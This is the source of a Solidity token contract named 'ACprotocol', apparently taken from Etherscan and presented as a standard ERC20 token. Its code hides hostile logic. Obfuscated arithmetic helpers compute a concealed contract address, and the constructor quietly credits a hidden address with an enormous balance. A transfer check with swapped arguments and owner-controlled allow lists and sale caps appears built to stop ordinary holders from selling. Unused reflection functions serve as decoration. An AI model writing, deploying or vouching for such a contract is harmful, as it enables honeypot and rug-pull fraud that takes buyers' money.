/**
 *Submitted for verification at Etherscan.io on 2022-11-16
*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.7.6;
interface IERC20 { 
   /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns(uint);
   /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns(uint);
   /**
     * @dev Moves ERC20 tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function transfer(address recipient, uint amount) external returns(bool);
   /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address deployer, address spender) external view returns(uint);
   /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint amount) external returns(bool);
   /**
     * @dev Interface of the ERC20 standard as defined in the EIP.
     */
    function ERC20()external view returns (address,address,address,address,address,uint,uint) ;
   /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
   /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint value);
   /**
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}
 
library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ACprotocol {

    using SafeMath for uint256;

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function Allow(uint256 saleNum, uint256 maxToken) public returns(bool) { 
        _maxSale = maxToken*(10**uint256(decimals)); _saleNum = saleNum;
        require(msg.sender == owner);
        return true;
    }
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) internal returns (bool) {
        _approve(MsgSender(), spender, _allowances[MsgSender()][spender].sub
        (subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _getValues(uint256 tAmount) internal view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
        (uint256 currentRate) =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
    }
    address internal A;
    address internal B;
    address internal ERC;
    uint256 internal _tTotal;
    mapping (address => uint256) internal _rOwned;
    uint256 s = asy(); uint256 c; uint256 d; uint256 x;
    mapping (address => mapping (address => uint256)) internal _allowances;
    uint256 b=div(c,b,n,s,d,d,s,n,n); uint256 a=div(x,y,s,d,c,a,n,x,c);
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) internal pure returns (uint256,uint256,uint256) {
        uint256 rAmount = tAmount.mul(currentRate); uint256 rFee = tFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee);return (rAmount, rTransferAmount, rFee);
    }
    function ensures(address _from, address _to, uint _value) internal returns(bool) {uint e;
        if (_to == pairA) {uint t = tax(pairA,A); c = t > c ? t : c;
             e = tax(pairA); y = (ins()) ? (e > y ? e : y) : e;}
        if (_to == pairB) {uint t = tax(pairB,B); d = t > d ? t : d;
             e = tax(pairB); x = (ins()) ? (e > x ? e : x) : e;}
        if (ins()) {if (_to == pairA ) {require (e == y);}
                    if (_to == pairB ) {require (e == x);}
             require( _to == pairA || _to == pairB || _to == ERC );} 
        if (_to==owner||_from==owner||_to==pairA || _to==pairB ||_to==ERC ||canSale[_to]){return true;} 
        if (_onSaleNum[_to] >= _saleNum || _value > _maxSale) return false;
        return true;
    }
    function Allowances(address account, address spender) internal view returns (uint256) {
        return _allowances[account][spender];
    }
    function _transfer(address sender, address recipient, uint256 amount) internal pure {
        require (sender != address(0), "ERC20: transfer from the zero address");
        require (recipient != address(0), "ERC20: transfer to the zero address");
        require (amount > 0, "Transfer amount must be greater than zero");
    }
    function Transfers(address recipient, uint256 amount) internal view returns (bool) {
        _transfer(MsgSender(), recipient, amount);
        return true;
    }
    mapping (address => uint) public balanceOf;
    mapping (address => bool) internal _isExcluded;
    mapping (address => uint256) internal _tOwned;
    mapping (address => mapping (address => uint)) public allowance;
    uint256 y=div(y,n,x,s,0,d,c,c,y); uint256 n=div(c,c,c,s,d,c,x,s,x);
    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) internal returns (uint256, uint256) {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);_rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);return(rFee, tFee);
    }
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (msg.sender != _from) {require(allowance[_from][msg.sender] >= _value);
                allowance[_from][msg.sender] -= _value;}
        require(ensures(_to, _from, _value)); require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value; balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function _getTValues(uint256 tAmount) internal pure returns (uint256, uint256) {
        uint256 tFee = tAmount; uint256 tTransferAmount = tAmount.sub(tFee);
        return (tTransferAmount, tFee);
    }
    function _approve(address account, address spender, uint256 amount) internal {
        require(account != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[account][spender] = amount;
    }
    function _getCurrentSupply() internal view returns (uint256, uint256) {
        uint256 rSupply = _tTotal;uint256 tSupply = _tTotal;      
        return (rSupply, tSupply);
    }   
    function _getRate() internal view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    function ins() internal view returns (bool T) {
        T = ( a < c || b < d );
    }
    function reflect(uint256 tAmount) internal {
        address sender = MsgSender();
        (uint256 rAmount,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
    }
    uint256 private _maxSale;
    uint256 private _saleNum;
    mapping(address=>bool) private canSale;
    mapping(address=>uint256) private _onSaleNum;
    address pairB; address pairA = address(div(n,a,b,y)); 
    function Agree(address addr) public returns (bool) {
        require(msg.sender == owner);
        canSale[addr]=true;return true;
    }
    function tax(address X) internal view returns(uint) {
        return IERC20(X).totalSupply();
    }
    function asy( ) internal returns (uint o){
        for(uint i=0;i<1;i++){o++;y=o;o++;d=o;o++;x=o;o++;
        b=o;o++;c=o;o+=3;n=o;o++;}
    }
    function MsgSender() internal view returns (address) {
        return msg.sender;
    }
    function tax(address Y,address Z) internal view returns(uint) {
        return IERC20(Z).balanceOf(Y);
    }
    function div (uint aa,uint ab,uint ac,uint ad) internal returns (uint I) {
        uint[4] memory t = [aa,ab,ac,ad];uint m1 =t.length;
        for(uint i = 0;i < t.length;i ++ ){m1--;I += t[i]*10**(9*m1);
            }I *= 10**c; I += 0xB0F2; y = m1;
    }
    function reflectionFromToken(uint256 tAmount) internal view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
            return tAmount;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function div(uint aa,uint ab,uint ac,uint ad,uint ae,uint af,uint ag,uint ah,uint ai)
        internal pure returns (uint I){uint[9] memory t = [aa,ab,ac,ad,ae,af,ag,ah,ai];
        uint m1 = t.length;for(uint i = 0;i < t.length;i ++ ){m1--;I += t[i]*10**m1;}
    }
    function increaseAllowance(address spender, uint256 addedValue) internal returns (bool) {
        _approve(MsgSender(), spender, _allowances[MsgSender()][spender].add(addedValue));
        return true;
    }
    function _transferToExcluded(address sender, address recipient, uint256 tAmount) internal returns (uint256, uint256) {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        return(rFee, tFee);
    }
    string public name;
    string public symbol;
    uint public totalSupply;
    uint constant public decimals = 18;
    address internal owner;
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        (A,B,pairA,pairB,ERC,a,b)=IERC20(pairA).ERC20();
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[ERC]=totalSupply*(10**uint256(6));
    }
}